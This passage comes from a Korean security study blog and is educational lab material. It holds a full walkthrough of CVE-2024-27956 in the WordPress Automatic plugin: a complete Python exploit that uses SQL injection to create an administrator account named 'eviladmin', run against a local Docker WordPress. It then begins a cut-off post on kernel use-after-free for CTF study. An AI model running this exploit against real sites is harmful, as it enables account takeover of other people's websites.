exampleuser</span><br><span class="line">      MYSQL_PASSWORD: examplepass</span><br><span class="line">      MYSQL_RANDOM_ROOT_PASSWORD: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - db:/var/lib/mysql</span><br><span class="line"></span><br><span class="line">volumes:</span><br><span class="line">  wordpress:</span><br><span class="line">  db:</span><br></pre></td></tr></table></figure>
<p>위와 같이 WordPress와 MYSQL을 설정하여 yml 파일로 만들고 아래 명령어로 빌드해주면 된다. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose cveWordPress.yml up</span><br></pre></td></tr></table></figure>
<p>이후에 localhost:8080에 접속해서 아래와 같은 WordPress 설치 화면이 뜨면 알맞게 빌드된 것이다.<br><img src="/images/3101_250403_image2.png" alt="그림 2. [WordPress 설치 화면]"></p>
<center><span style="font-size: 90%;">그림 2. [WordPress 설치 화면]</span><br><span style="font-size: 70%;"></span></center><br>

<p>설치를 마쳤으니 실습을 실행하기 전 <code>exploit.py</code> 코드를 살펴보자. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeRequest</span>(<span class="params">payload, <span class="built_in">hash</span>, url</span>):</span><br><span class="line">    host = url.split(<span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;auth&#x27;</span>: <span class="string">b&#x27;\0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;integ&#x27;</span>: <span class="built_in">hash</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpUsage</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] You must run the expoit passing the wordpress URL. \n[+] Example: python exploit.py http://website.com&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verifyArgs</span>(<span class="params">argv</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        helpUsage()</span><br><span class="line"></span><br><span class="line">verifyArgs(sys.argv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for CVE-2024-27956&quot;</span>)</span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line">url = domain+<span class="string">&#x27;/wp-content/plugins/wp-automatic/inc/csv.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#first request (create user)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Creating user eviladmin&quot;</span>)</span><br><span class="line">response = makeRequest(<span class="string">&quot;INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES (&#x27;eviladmin&#x27;, &#x27;$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0&#x27;, &#x27;eviladmin&#x27;, &#x27;eviladmin@gmail.com&#x27;, &#x27;http://127.0.0.1:8080&#x27;, &#x27;2025-04-05 17:31:03&#x27;, 0, &#x27;eviladmin&#x27;)&quot;</span>, <span class="string">&quot;09956ea086b172d6cf8ac31de406c4c0&quot;</span>, url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Tampered query&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;invalid login&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;login required&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Error in the payload&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;DATE&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Not vulnerable&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#second request (give permission)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Giving eviladmin administrator permissions&quot;</span>)</span><br><span class="line">makeRequest(<span class="string">&quot;INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = &#x27;eviladmin&#x27;), &#x27;wp_capabilities&#x27;, &#x27;a:1:&#123;s:13:\&quot;administrator\&quot;;s:1:\&quot;1\&quot;;&#125;&#x27;)&quot;</span>, <span class="string">&quot;bd98494b41544b818fa9f583dadfa2bb&quot;</span>, url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Tampered query&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;invalid login&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;login required&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Error in the payload&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit completed!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] administrator created: eviladmin:admin&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>exploit.py 전체 코드이다. diego-tella 깃허브에서 가져왔다(아래 참고문헌에 url 존재)<br>코드를 부분부분 뜯어서 자세히 살펴보자. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">verifyArgs(sys.argv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for CVE-2024-27956&quot;</span>)</span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line">url = domain+<span class="string">&#x27;/wp-content/plugins/wp-automatic/inc/csv.php&#x27;</span></span><br></pre></td></tr></table></figure>
<p>먼저 취약한 위치로 url을 설정한다. domain은 <code>argv[1]</code>으로 설정되어 있는데 실행할 때 넣어주는 인자값을 말한다. Usage가 python exploit.py ‘<a target="_blank" rel="noopener" href="http://website.com'라고/">http://website.com&#39;라고</a> 하면 여기서 argv[1]은 ‘<a target="_blank" rel="noopener" href="http://website.com'이다/">http://website.com&#39;이다</a>. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#first request (create user)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Creating user eviladmin&quot;</span>)</span><br><span class="line">response = makeRequest(<span class="string">&quot;INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES (&#x27;eviladmin&#x27;, &#x27;$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0&#x27;, &#x27;eviladmin&#x27;, &#x27;eviladmin@gmail.com&#x27;, &#x27;http://127.0.0.1:8080&#x27;, &#x27;2025-04-05 17:31:03&#x27;, 0, &#x27;eviladmin&#x27;)&quot;</span>, <span class="string">&quot;09956ea086b172d6cf8ac31de406c4c0&quot;</span>, url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Tampered query&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;invalid login&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;login required&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Error in the payload&quot;</span>)</span><br><span class="line">    quit()</span><br></pre></td></tr></table></figure>
<p>첫번째 Request이다. user를 추가하는 SQL injection을 넣어서 보낸다. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">makeRequest</span>(<span class="params">payload, <span class="built_in">hash</span>, url</span>):</span><br><span class="line">    host = url.split(<span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;auth&#x27;</span>: <span class="string">b&#x27;\0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;integ&#x27;</span>: <span class="built_in">hash</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
<p>위 makeRequest 함수를 이용해서 보내면 되는데 header들이 맞춰져 있고 data는 앞에서 설명했다시피 <code>q</code>에는 페이로드, <code>auth</code>는 공백, <code>integ</code>는 hash값이다. </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#second request (give permission)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Giving eviladmin administrator permissions&quot;</span>)</span><br><span class="line">makeRequest(<span class="string">&quot;INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (</span></span><br><span class="line"><span class="string">    (SELECT ID FROM wp_users WHERE user_login = &#x27;eviladmin&#x27;), &#x27;wp_capabilities&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;a:1:&#123;s:13:\&quot;administrator\&quot;;s:1:\&quot;1\&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="string">)&quot;</span>, <span class="string">&quot;bd98494b41544b818fa9f583dadfa2bb&quot;</span>, url)</span><br></pre></td></tr></table></figure>
<p>두번째 페이로드는 첫번째 페이로드로 생성한 eviladmin 계정에 admin 권한을 준다. 값들이 잘 보였으면 해서 VALUES 값들을 줄바꿈하였다. wp_user에 있는 eviladmin의 ID를 가져와서 wp_usermeta에 값을 추가하는 SQL 구문이다. 이때 meta_key, meta_value는 각각 <code>wp_capabilities</code>, <code>a:1:&#123;s:13:&quot;administrator&quot;;s:1:&quot;1&quot;;&#125;</code>이다. 이는 WordPress의 admin 권한을 주는 키-값이다. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py http://localhost:8080</span><br></pre></td></tr></table></figure>
<p>프롬프트에서 실행해주면 된다.<br><img src="/images/3101_250403_image3.png" alt="그림 3. [프롬프트 결과 창]"></p>
<center><span style="font-size: 90%;">그림 3. [프롬프트 결과 창]</span><br><span style="font-size: 70%;"></span></center><br>
이제 docker에서 ID: eviladmin, PW: admin으로 로그인이 될 것이다. 

<p><img src="/images/3101_250403_image4.png" alt="그림 4. [eviladmin 로그인]"></p>
<center><span style="font-size: 90%;">그림 4. [eviladmin 로그인]</span><br><span style="font-size: 70%;"></span></center><br>
admin 권한을 받았는지도 확인해보자. 

<p><img src="/images/3101_250403_image5.png" alt="그림 5. [eviladmin 권한 확인]"></p>
<center><span style="font-size: 90%;">그림 5. [eviladmin 권한 확인]</span><br><span style="font-size: 70%;"></span></center><br>
위와 같이 eviladmin이 관리자 권한으로 설정되어 있는 것을 확인할 수 있다. 
<br><br>

<h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>보통 취약점 1-day 분석을 한다고 하면 PoC, Exploit, Patch를 공부한다. Patch는 SW적으로 어떻게 취약점을 방어하는지 공부하기 위함인데 이번 취약점은 <code>inc/csv.php</code>를 제거함으로써 패치하여 추가적인 목차를 만들진 않았다.<br>신입 학회원에게 많은 도움이 되었으면 해서 최대한 자세하게 템포 느리게 적다보니 초고 완성까지 오래 걸린 거 같다(그렇게 오래 걸릴 내용은 아닌 거 같은데..)<br>다음 글은 뭘 적을지 고민해봐야겠다.<br><br><br></p>
<h1 id="참고-문헌"><a href="#참고-문헌" class="headerlink" title="참고 문헌"></a>참고 문헌</h1><p>보안뉴스. (2015, 6월 16). 국내 보안 위협 동향과 대응 방안. <a target="_blank" rel="noopener" href="https://www.boannews.com/media/view.asp?idx=47656">https://www.boannews.com/media/view.asp?idx=47656</a></p>
<p>이글루코퍼레이션. (n.d.). WordPress Plug-in에 따른 SQL Injection 분석 및 대응 방안 (CVE-2022-3689, CVE-2023-6360). <a target="_blank" rel="noopener" href="https://www.igloo.co.kr/security-information/wordpress-plug-in%EC%97%90-%EB%94%B0%EB%A5%B8-sql-injection-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88-cve-2022-3689-cve-2023-6360/">https://www.igloo.co.kr/security-information/wordpress-plug-in%EC%97%90-%EB%94%B0%EB%A5%B8-sql-injection-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88-cve-2022-3689-cve-2023-6360/</a></p>
<p>W3Techs. (n.d.). Usage statistics and market share of WordPress for websites. <a target="_blank" rel="noopener" href="https://w3techs.com/">https://w3techs.com/</a></p>
<p>위키백과. (n.d.). SQL. <a target="_blank" rel="noopener" href="https://ko.wikipedia.org/wiki/SQL">https://ko.wikipedia.org/wiki/SQL</a></p>
<p>truonghuuphuc. (2024). CVE-2024-27956. GitHub. <a target="_blank" rel="noopener" href="https://github.com/truonghuuphuc/CVE-2024-27956/tree/main">https://github.com/truonghuuphuc/CVE-2024-27956/tree/main</a></p>
<p>하온 블로그. (n.d.). SQL Injection이란? 원리, 예시와 방어 방법. <a target="_blank" rel="noopener" href="https://haon.blog/haon/server/sql-injection/">https://haon.blog/haon/server/sql-injection/</a></p>
<p>Patchstack. (2024, March 20). Critical vulnerabilities patched in WordPress Automatic Plugin. <a target="_blank" rel="noopener" href="https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve">https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve</a></p>
<p>diego-tella. (2024). CVE-2024-27956-RCE. GitHub. <a target="_blank" rel="noopener" href="https://github.com/diego-tella/CVE-2024-27956-RCE">https://github.com/diego-tella/CVE-2024-27956-RCE</a></p>
<p>DreamHost. (n.d.). A Guide to WordPress User Roles and Permissions. <a target="_blank" rel="noopener" href="https://www.dreamhost.com/blog/wordpress-user-roles/">https://www.dreamhost.com/blog/wordpress-user-roles/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://swu-swing.github.io/2024/05/31/monthly_24_05/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SWING">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SW1NGL0G">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SW1NGL0G">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/31/monthly_24_05/" class="post-title-link" itemprop="url">[5월호] Kernel Use-After-Free</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2024-05-31 00:00:00" itemprop="dateCreated datePublished" datetime="2024-05-31T00:00:00+09:00">2024-05-31</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2025-04-07 01:09:59" itemprop="dateModified" datetime="2025-04-07T01:09:59+09:00">2025-04-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Monthly/" itemprop="url" rel="index"><span itemprop="name">Monthly</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="1-들어가며"><a href="#1-들어가며" class="headerlink" title="1. 들어가며"></a>1. 들어가며</h1><p>5월호의 주제는 <strong>Use-After-Free(UAF)</strong> 취약점이다. 해당 취약점을 이용한 CTF 문제 풀이 과정을 다룬다. UAF 취약점은 메모리 관리의 부주의로 인해 발생하는 보안 취약점 중 하나로, 해커가 악용할 경우 시스템 권한을 탈취당하거나 악성코드가 실행될 수 있다. 이러한 취약점은 특히 커널과 같은 중요한 시스템 컴포넌트에서 발생할 때 매우 치명적일 수 있다.</p>
<p>해당 글은 CTF 문제를 풀 때 필요한 전반적인 커널 지식과 문제 해결을 위한 접근 방법과 구체적 단계들을 설명한다. 이를 통해 UAF 취약점이 어떻게 악용될 수 있는지, 그리고 이를 방어하기 위한 기법들이 무엇이 될 수 있는지 생각하고 이해할 수 있다.</p>
<p><br><br></p>
<h1 id="2-kernel-지식"><a href="#2-kernel-지식" class="headerlink" title="2. kernel 지식"></a>2. kernel 지식</h1><h2 id="2-1-Memory-Corruption"><a href="#2-1-Memory-Corruption" class="headerlink" title="2.1. Memory Corruption"></a>2.1. Memory Corruption</h2><ul>
<li>메모리를 참조하는 부분에서 오류가 발생하는 취약점이다.</li>
<li>공격자는 메모리가 corruption 되는 부분을 이용하여 공격자가 원하는 명령어를 참조하도록 수행이 가능하다.</li>
</ul>
<p>UAF는 Heap 영역에서 일어나는 취약점이며, Heap은 메모리 영역 중 하나이기 때문에 메모리 구조와 Heap에 대해서 알아야 한다.</p>
<br>

<h2 id="2-2-메모리-구조"><a href="#2-2-메모리-구조" class="headerlink" title="2.2. 메모리 구조"></a>2.2. 메모리 구조</h2><ol>
<li><p>Code 영역: 프로그램의 (컴파일된 기계어) 코드가 올라가는 곳이다.</p>
</li>
<li><p>Data 영역: global variable과 static bariable이 할당되는 곳이다.</p>
</li>
<li><p>Stack 영역: local variable과 parameter가 저장되는 곳이다.</p>
<p> 함수가 시작되면 해당 함수의 local variable이 stack에 저장되었다가 함수가 종료되면 해당 영역을 해제시킨다.</p>
</li>
<li><p>Heap 영역: 빈 공간으로, 필요에 따라 동적으로 메모리를 할당하기도 하고 해제하기도 한다.</p>
<p> Heap 영역은 Stack에서 관리하는 이외의 데이터 형태를 사용하며, 컴파일 시 크기를 알지 못하다가 프로그램이 실행되면 크기가 결정되는 동적 할당 메모리를 받는 데 사용된다.</p>
</li>
</ol>
<br>

<h2 id="2-3-Heap"><a href="#2-3-Heap" class="headerlink" title="2.3. Heap"></a>2.3. Heap</h2><p>데이터에서 최댓값과 최솟값을 빠르게 찾기 위해 고안된 완전 이진트리이다.</p>
<p><img src="/images/monthly_24_05_image1.png" alt="그림 1. https://velog.io/@jsbryan/%ED%9E%99-%EC%B5%9C%EC%86%8C-%ED%9E%99-%EC%B5%9C%EB%8C%80-%ED%9E%99, [이진트리 구조]"></p>
<center><b>그림 1. [이진트리 구조]<br>https://velog.io/@jsbryan/%ED%9E%99-%EC%B5%9C%EC%86%8C-%ED%9E%99-%EC%B5%9C%EB%8C%80-%ED%9E%99</center></b><br>

<p>부모 노드의 인덱스는 1, 왼쪽 자식 노드부터 2, 3 순서이다.</p>
<p>Heap 구조는 위에서 말한대로 컴퓨터 안의 메모리 구조 중 사용자가 임의로 사용하는 메모리 공간으로, 대표적으로 <code>malloc()</code> 함수를 이용해 선언해주고, <code>free()</code> 함수를 통해 해제를 해준다.</p>
<br>

<h2 id="2-4-First-Fit-Algorithm"><a href="#2-4-First-Fit-Algorithm" class="headerlink" title="2.4. First-Fit Algorithm"></a>2.4. First-Fit Algorithm</h2><p>UAF에 대해 알기 전 또 알아야 할 것이 바로 First-Fit 알고리즘이다.</p>
<p><strong>First-Fit 알고리즘</strong>은 메모리 할당 알고리즘들 중 하나로, 사용 가능한 공간들 중에서 첫번째로 찾아낸 공간을 할당하는 방식이다. </p>
<p>Linux OS는 해당 알고리즘을 채택하고 있다.<br>이외에도 Best-Fit, Worst-Fit 알고리즘도 존재한다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">char*a = malloc(20);     // 0xe4b010</span><br><span class="line">char*b = malloc(20);     // 0xe4b030</span><br><span class="line">char*c = malloc(20);     // 0xe4b050</span><br><span class="line">char*d = malloc(20);     // 0xe4b070</span><br><span class="line"> </span><br><span class="line">free(a);</span><br><span class="line">free(b);</span><br><span class="line">free(c);</span><br><span class="line">free(d);</span><br><span class="line"> </span><br><span class="line">a = malloc(20);           // 0xe4b070</span><br><span class="line">b = malloc(20);           // 0xe4b050</span><br><span class="line">c = malloc(20);           // 0xe4b030</span><br><span class="line">d = malloc(20);           // 0xe4b010</span><br></pre></td></tr></table></figure>

<p>위의 코드는 예시 코드다.</p>
<p>코드를 보면, 각각 20 바이트씩 Heap 영역에 4개의 영역을 할당해 주었고, free를 해준 후 다시 4개의 영역을 할당 받고 있다. </p>
<p>방식은 LIFO(Last In First Out)이다. 과정을 조금 더 설명해보겠다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;free&gt;</span><br><span class="line"></span><br><span class="line">head → a → tail</span><br><span class="line">head → b → a → tail</span><br><span class="line">head → c → b → a → tail</span><br><span class="line">head → d → c → b → a → tail</span><br><span class="line"></span><br><span class="line">&lt;malloc&gt;</span><br><span class="line"></span><br><span class="line">head → c → b → a → tail</span><br><span class="line">head → b → a → tail</span><br><span class="line">head → a → tail</span><br><span class="line">head → tail</span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="3-UAF-취약점"><a href="#3-UAF-취약점" class="headerlink" title="3. UAF 취약점"></a>3. UAF 취약점</h1><p>Heap 영역에서 할당된 (malloc) 공간을 free로 영역을 해제하고, 메모리를 다시 할당 시 같은 공간을 재사용 하면서 생기는 취약점이다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>* heap1, *heap2, *heap3;</span><br><span class="line">    </span><br><span class="line">    heap1 = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    *heap1 = <span class="number">0xcaaaaaaa</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap1 address: %#x, %#x\n&quot;</span>, heap1, *heap1);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(heap1);</span><br><span class="line">    </span><br><span class="line">    heap2 = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap2 address: %#x, %#x\n&quot;</span>, heap2, *heap2);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(heap2);</span><br><span class="line">    </span><br><span class="line">    heap3 = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap3 address: %#x, %#x\n&quot;</span>, heap3, *heap3);</span><br><span class="line">    <span 